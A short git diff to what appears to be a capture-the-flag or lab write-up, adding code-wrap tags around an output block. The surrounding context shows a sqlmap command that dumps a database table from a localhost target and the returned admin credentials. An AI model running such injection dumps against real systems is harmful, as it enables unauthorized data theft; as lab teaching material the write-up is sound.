@@ -40,6 +40,7 @@ layout:
 -   `sqlmap -u "http://localhost:9999/?id=1" --batch --proxy=http://127.0.0.1:8080 -T bug_reports -C description --where id=11 --dump --threads 10`
 -   The hidden bug report is returned, which indicates there's an admin endpoint with weak creds
 
+{% code overflow="wrap" %}
 ```bash
 +--------------------------------------+
 | description                          |
@@ -47,6 +48,7 @@ layout:
 | crypt0:c4tz on /4dm1n_z0n3, really?! |
 +--------------------------------------+
 ```
+{% endcode %}
 
 ## Part 2: Weak JWT Signing Key
 
